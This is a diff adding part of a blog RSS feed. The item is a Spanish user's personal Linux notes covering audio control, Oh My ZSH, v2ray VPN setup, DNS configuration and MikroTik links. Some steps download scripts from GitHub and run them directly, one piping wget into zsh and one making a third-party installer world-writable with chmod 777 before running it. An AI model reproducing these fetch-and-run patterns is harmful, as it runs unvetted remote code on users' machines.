+&lt;p&gt;https://www.linuxparty.es/41-musica/10275-administrar-el-sonido-y-audio-desde-consola-linux.html
+alsamixer&lt;/p&gt;
+
+&lt;p&gt;Para configurar el volumen maestro use:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Obtiene una lista de controles simples de mezclador 
+$ amixer scontrols 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Luego ajústelo al volumen deseado, como ejemplo&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;amixer sset &#39;Master&#39; 50%
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Algunos ejemplos más:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Aumenta un 3%
+amixer -q sset Master 3%+
+
+# Disminución en un 3%
+amixer -q sset Master 3%-
+
+# Activar / desactivar (Mute)
+amixer -q sset Master toggle
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;cómo-escuchar-mi-voz-en-altavoces-con-micrófono&quot;&gt;¿Cómo escuchar mi voz en altavoces con micrófono?&lt;/h4&gt;
+&lt;p&gt;https://qastack.mx/ubuntu/123798/how-to-hear-my-voice-in-speakers-with-a-mic&lt;/p&gt;
+
+&lt;p&gt;Extension para Gnome: PulseAudio Loopback Device
+https://extensions.gnome.org/extension/954/pulseaudio-loopback-device/&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Primero instale PulseAudio Volume Control / pavucontrol.
+
+Instale a través del Administrador de software.
+
+O ejecute este comando a continuación en la terminal:
+
+sudo apt-get install pavucontrol
+
+Para iniciar el funcionamiento del micrófono al altavoz, ejecute el siguiente comando en la terminal.
+
+pactl load-module module-loopback latency_msec=1
+
+Para detener lo mismo, ejecute el siguiente comando en la terminal.
+
+pactl unload-module $(pactl list short modules | awk &#39;$2 ==&quot;module-loopback&quot; { print $1 }&#39; - )
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;tipo-webstripper-spider&quot;&gt;Tipo webstripper (Spider)&lt;/h4&gt;
+&lt;p&gt;https://www.linux-magazine.com/Online/Features/WebHTTrack-Website-Copier
+sudo apt-get install httrack webhttrack&lt;/p&gt;
+
+&lt;h4 id=&quot;proxy-offline&quot;&gt;Proxy OffLine&lt;/h4&gt;
+&lt;p&gt;http://proxy-offline-browser.com/private/Description.html
+https://proxy-offline-browser.com/private/Download.html
+/home/javier/Descargas/temp/MM3-WebAssistantPrivate/MM3-WebAssistant.jar&lt;/p&gt;
+
+&lt;h4 id=&quot;ver-especificaciones-completas-de-un-pc&quot;&gt;Ver especificaciones completas de un PC&lt;/h4&gt;
+&lt;p&gt;sudo lshw&lt;/p&gt;
+
+&lt;h4 id=&quot;generador-de-sonidos&quot;&gt;Generador de sonidos&lt;/h4&gt;
+&lt;p&gt;https://qastack.mx/unix/82112/stereo-tone-generator-for-linux&lt;/p&gt;
+
+&lt;h5 id=&quot;pequeñas-variantes-del-anterior&quot;&gt;Pequeñas variantes del anterior&lt;/h5&gt;
+&lt;p&gt;https://www.it-swarm-es.com/es/audio/estereo-generador-de-tonos-para-linux/956744204/&lt;/p&gt;
+
+&lt;h5 id=&quot;variante-con-ffmpeg&quot;&gt;Variante con ffmpeg&lt;/h5&gt;
+&lt;p&gt;https://ffmpeg.org/ffmpeg-filters.html#anoisesrc
+ffplay -f lavfi -i “anoisesrc=d=60:c=pink:r=44100:a=0.5” -autoexit -nodisp
+Specify the color of noise. Available noise colors are white, pink, brown, blue, violet and velvet. Default color is white.&lt;/p&gt;
+
+&lt;h5 id=&quot;generador-de-sonidos-otro&quot;&gt;Generador de sonidos otro&lt;/h5&gt;
+&lt;p&gt;sudo apt-get install sox
+play -n synth 60:00 whitenoise
+play -n synth 60:00 pinknoise
+play -n synth 60:00 brownnoise&lt;/p&gt;
+
+&lt;h4 id=&quot;zsh-un-sheel-de-linux-muy-amigable&quot;&gt;ZSH un sheel de Linux muy amigable&lt;/h4&gt;
+&lt;p&gt;https://geekytheory.com/como-instalar-oh-my-zsh-en-ubuntu
+https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/git&lt;/p&gt;
+
+&lt;p&gt;Pasos para instalar Oh My ZSH&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Instalar ZSH y git-core
+sudo apt-get install zsh
+sudo apt-get install git-core&lt;/li&gt;
+  &lt;li&gt;Descargar el instalador de Oh My ZSH y ejecutarlo
+wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | zsh&lt;/li&gt;
+  &lt;li&gt;Cambiar el shell a ZSH
+chsh -s &lt;code class=&quot;highlighter-rouge&quot;&gt;which zsh&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Reiniciar la consola y/o el equipo&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Cambiar a bash:
+exec bash
+Cambiar a zsh:
+exec zsh&lt;/p&gt;
+
+&lt;p&gt;bash como predeterminado
+chsh -s /bin/bash
+zsh como predeterminado
+chsh -s /bin/zsh&lt;/p&gt;
+
+&lt;h2 id=&quot;descarga-imagenes-iso-ubuntu&quot;&gt;Descarga imagenes ISO Ubuntu&lt;/h2&gt;
+&lt;p&gt;https://releases.ubuntu.com/18.04/ubuntu-18.04.5-live-server-amd64.iso
+https://releases.ubuntu.com/&lt;/p&gt;
+&lt;h2 id=&quot;proxy-netflix&quot;&gt;Proxy Netflix&lt;/h2&gt;
+&lt;p&gt;https://github.com/ab77/netflix-proxy&lt;/p&gt;
+&lt;h2 id=&quot;un-para-de-datos-de-dns&quot;&gt;Un para de datos de DNS&lt;/h2&gt;
+&lt;p&gt;https://coredns.io/manual/toc/
+https://www.v2ray.com/en/configuration/dns.html&lt;/p&gt;
+&lt;h2 id=&quot;tipo-iptv-gratis&quot;&gt;Tipo iptv gratis&lt;/h2&gt;
+&lt;p&gt;https://spliktv.web.app/&lt;/p&gt;
+&lt;h2 id=&quot;doncker-online&quot;&gt;Doncker online&lt;/h2&gt;
+&lt;p&gt;https://labs.play-with-docker.com/&lt;/p&gt;
+
+&lt;h2 id=&quot;v2ray-zeta&quot;&gt;v2ray Zeta&lt;/h2&gt;
+
+&lt;p&gt;sudo apt update
+sudo apt upgrade
+#no es necesario reiniciar
+wget https://raw.githubusercontent.com/zeta-sys/instv2rayzeta/main/v2rayzeta.sh &amp;amp;&amp;amp; chmod 777 v2rayzeta.sh &amp;amp;&amp;amp; ./v2rayzeta.sh
+wget https://raw.githubusercontent.com/zeta-sys/instv2rayzeta/main/zetav2ray2.sh &amp;amp;&amp;amp; chmod 777 zetav2ray2.sh &amp;amp;&amp;amp; ./zetav2ray2.sh&lt;/p&gt;
+
+&lt;p&gt;Al instalar crea una configuración x defecto&lt;/p&gt;
+&lt;h3 id=&quot;cambiar-protocolo-a-websocket&quot;&gt;Cambiar protocolo a websocket&lt;/h3&gt;
+&lt;p&gt;3.ADM. CONFIG.
+    5.CAMBIAR PROTOCOLO
+        3.WebSocket
+        en dominio falso: subdominio&lt;/p&gt;
+
+&lt;h3 id=&quot;cambiar-puerto-a-80&quot;&gt;Cambiar puerto a 80&lt;/h3&gt;
+&lt;p&gt;3.ADM. CONFIG.
+    4.CAMBIAR PUERTO
+        80 (Enter)&lt;/p&gt;
+
+&lt;h3 id=&quot;crear-usuario&quot;&gt;Crear usuario&lt;/h3&gt;
+&lt;p&gt;2.ADM. CLIENTES
+    1.AGREGAR USUARIO
+    Enter para que coloque un email falso utomaticamente.&lt;/p&gt;
+
+&lt;h3 id=&quot;copiar-vmes&quot;&gt;Copiar vmes&lt;/h3&gt;
+&lt;p&gt;4.VER INFO CLIENTES
+    El nro. de cliente mas grande es el último creado&lt;/p&gt;
+
+&lt;p&gt;verificar si guardó ip
+cat /etc/resolv.conf&lt;/p&gt;
+
+&lt;p&gt;TLS no se toca, queda cerrado, aveces es necesario abrirlo, pero en general queda cerrado.
+Cerrado
+Probar
+Abrile el tcpfastopen
+Eso lo acelera
+Para desactivarlo opcion CERRAR&lt;/p&gt;
+
+&lt;p&gt;sudo /etc/init.d/networking restart&lt;/p&gt;
+
+&lt;p&gt;para que no reinice la conf 
+sudo apt update
+sudo apt install resolvconf
+.
+sudo systemctl status resolvconf.service&lt;/p&gt;
+
+&lt;p&gt;sudo systemctl enable resolvconf.service 
+sudo systemctl start resolvconf.service 
+sudo systemctl status resolvconf.service&lt;/p&gt;
+
+&lt;p&gt;………………………………&lt;/p&gt;
+
+&lt;p&gt;#instalar programa necesario para activar DNS
+sudo apt update
+sudo apt install resolvconf
+sudo systemctl status&lt;/p&gt;
+
+&lt;p&gt;#Si no esta activado resolvconf.service
+#reinciar servicios con:
+sudo systemctl enable resolvconf.service 
+sudo systemctl start resolvconf.service 
+sudo systemctl status resolvconf.service&lt;/p&gt;
+
+&lt;p&gt;#editar a mano archivo de configuración
+sudo nano /etc/resolvconf/resolv.conf.d/head
+#colocar
+nameserver 190.114.255.193
+#salir grabando
+#para actualizar archivo configuración esclavo
+sudo resolvconf –enable-updates
+sudo resolvconf -u
+#Revisa si figura la dns q pusimos
+sudo cat /etc/resolv.conf&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;creo que aunque duela.
+rehacer en este orden
+Rebuild con ubuntu 20
+instalar kalix
+instalar v2ray
+configurar v2ray
+configurar kalix
+configurar dns kalix
+configurar dns con los comandos&lt;/p&gt;
+
+&lt;h2 id=&quot;mikrotik-monetizable&quot;&gt;Mikrotik Monetizable&lt;/h2&gt;
+&lt;p&gt;Mikrotik configurar conexiones como si fueran clientes&lt;br /&gt;
+https://www.youtube.com/watch?v=4rY–Wali-s&lt;/p&gt;
+
+&lt;p&gt;Descargar Router OS&lt;br /&gt;
+https://mikrotik.com/download&lt;/p&gt;
+
+&lt;p&gt;instalar Winbox bajo Linux&lt;br /&gt;
+https://www.dagorret.com.ar/instalar-winbox-linux-ubuntu-fedora-mint-entro-otros/&lt;/p&gt;
+
+&lt;p&gt;Cómo configurar MikroTik RouterOS para compartir el acceso a Internet&lt;br /&gt;
+https://www.raulprietofernandez.net/blog/mikrotik/como-configurar-mikrotik-routeros-para-compartir-el-acceso-a-internet&lt;/p&gt;
+
+&lt;p&gt;Un ejemplo de negocio monetizado&lt;br /&gt;
+http://www.hotspotsystem.com/es/installation-guide-mikrotik-manual&lt;/p&gt;
+
+&lt;p&gt;Alernativa gratis a Mikrotik
+pfSense o Mikrotik: ¿Cual elegir?
+https://clouding.io/kb/pfsense-o-mikrotik/&lt;/p&gt;
+
+&lt;p&gt;Seguridad inicial para mikrotik como isp
+https://www.youtube.com/watch?time_continue=7&amp;amp;v=_9wARwQMA50&amp;amp;feature=emb_logo&lt;/p&gt;
+
+&lt;p&gt;Como ser un WISP&lt;br /&gt;
+https://www.youtube.com/watch?v=Nt0AB582G1I&lt;/p&gt;
+
+&lt;p&gt;1MB de trafico internacional cuesta 10USD&lt;/p&gt;
+
+&lt;p&gt;Video 45min para configurar mikrotik
+https://configurarmikrotikwireless.com/video1-45-mins&lt;/p&gt;
+
+&lt;p&gt;Tipo buenos aires libre con mikrotik&lt;br /&gt;
+http://tombatossals.github.io/taller-nodos-hibridos/#1&lt;/p&gt;
+
+&lt;h2 id=&quot;extraer-audio-de-un-video&quot;&gt;Extraer audio de un video&lt;/h2&gt;
+&lt;p&gt;Con el programa mplayer
+sudo apt-get install mplayer mplayer-gui mplayer-skins
+https://www.adslfaqs.com/como-instalar-mplayer-en-ubuntu-linux-con-codecs-y-soporte-de-dvd/
+http://www1.mplayerhq.hu/design7/news-es.html&lt;/p&gt;
+
+&lt;h3 id=&quot;controlando-mplayer&quot;&gt;Controlando mplayer&lt;/h3&gt;
+&lt;p&gt;https://linsolitic.wordpress.com/2017/03/10/controlando-mplayer/&lt;/p&gt;
+
+&lt;h3 id=&quot;convertir-con-mplayer-pero-no-siempre-me-funciona&quot;&gt;Convertir con mplayer pero no siempre me funciona&lt;/h3&gt;
+&lt;p&gt;mplayer -vo null -dumpaudio -dumpfile archivo.mp3 basshunter_saturday.mkv
+otra forma. No sé cual será la mejor
+mplayer -dumpaudio Archivo_video.flv -dumpfile Archivo_audio.mp3&lt;/p&gt;
+&lt;h3 id=&quot;convertir-con-otro&quot;&gt;Convertir con otro&lt;/h3&gt;
+&lt;p&gt;ffmpeg -i video -f mp3 audio.mp3
+https://ugeek.github.io/blog/post/2019-09-30-extraer-audio-de-un-v%C3%ADdeo-con-ffmpeg.html&lt;/p&gt;
+
+&lt;h3 id=&quot;reproduciendo-con-mpv&quot;&gt;Reproduciendo con mpv&lt;/h3&gt;
+&lt;p&gt;Tiene la opcion de no mostrar el video en un archivo de video.
+mpv –no-video ~/Música/
+https://mpv.io/&lt;/p&gt;
+
+&lt;h3 id=&quot;pipenv-gestor-de-entornos-virtuales-de-python&quot;&gt;Pipenv: gestor de entornos virtuales de Python&lt;/h3&gt;
+&lt;p&gt;https://jarroba.com/pipenv-gestor-de-entornos-virtuales-de-python/&lt;/p&gt;
+
+&lt;h3 id=&quot;mas-de-30-comandos-en-linux-para-manejar-tu-server&quot;&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=0BA4k3jweaE&quot;&gt;MAS DE 30 COMANDOS en LINUX para manejar tu SERVER!&lt;/a&gt;&lt;/h3&gt;
+
+&lt;h2 id=&quot;latincloud&quot;&gt;latinCloud&lt;/h2&gt;
+&lt;p&gt;Por que me dices que puede ser un problema con la clave? Si como muesta la captura, ni siquiera me llega a pedir la clave.
+Mandale Rebuild, desde que contraté el sercicio, en 4 dias solo he podido ejecutar 3 o 4 comandos.
+Si tuvieran Rebuild en el panel la situación hubiera sido mas ágil. No pierdo nada con un rebuild.&lt;/p&gt;
+
+&lt;p&gt;Waiting for cache lock: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process 1256 (apt-get)… 103s&lt;/p&gt;
+
+&lt;p&gt;Last login: Thu May 27 22:31:31 2021 from 45.239.34.33
+root@60abbab048545:~# apt update
+Get:1 http://security.ubuntu.com/ubuntu focal-security InRelease [114 kB]
+Hit:2 http://us.archive.ubuntu.com/ubuntu focal InRelease
+Hit:3 http://us.archive.ubuntu.com/ubuntu focal-updates InRelease
+Get:4 http://us.archive.ubuntu.com/ubuntu focal-backports InRelease [101 kB]
+Fetched 214 kB in 1s (163 kB/s)                                  &lt;br /&gt;
+Reading package lists… Done
+Building dependency tree     &lt;br /&gt;
+Reading state information… Done
+7 packages can be upgraded. Run ‘apt list –upgradable’ to see them.
+root@60abbab048545:~# apt upgrade
+E: dpkg was interrupted, you must manually run ‘dpkg –configure -a’ to correct the problem.&lt;/p&gt;
+
+&lt;p&gt;Buenas tardes.
+Estoy instalando una aplicación que en un momento que debe validar externamete, y no continúa.
+Consultando al soporte de dicha aplicación me indican que debe estar abierto el puerto 81 TCP.
+Paso captura de mi verificación en el VPS. El puerto 81 se muestra como abierto.
+Uds tiene alguna restricción del puerto 81? 
+Como puedo habilitarlo?
+Saludos.&lt;/p&gt;
+
+&lt;h3 id=&quot;iptv-para-linux&quot;&gt;IPTV para Linux&lt;/h3&gt;
+&lt;p&gt;SMPlayer
+sudo apt install smplayer&lt;/p&gt;
+
+&lt;h3 id=&quot;error-de-certificado-ssl-en-python&quot;&gt;Error de certificado SSL en Python&lt;/h3&gt;
+&lt;p&gt;I had a similar problem on one of my Linux machines. Generating fresh certificates and exporting an environment variable pointing to the certificates directory fixed it:&lt;/p&gt;
+
+&lt;p&gt;$ sudo update-ca-certificates –fresh
+$ export SSL_CERT_DIR=/etc/ssl/certs&lt;/p&gt;
+</description>
+        <pubDate>Mon, 09 Aug 2021 15:13:32 -0300</pubDate>
+        <link>http://yourdomain.com/jekyll/update/2021/08/09/doc2.html</link>
+        <guid isPermaLink="true">http://yourdomain.com/jekyll/update/2021/08/09/doc2.html</guid>
+        
+        
+        <category>jekyll</category>
+        
+        <category>update</category>
+        
+      </item>
+    
+  </channel>
+</rss>
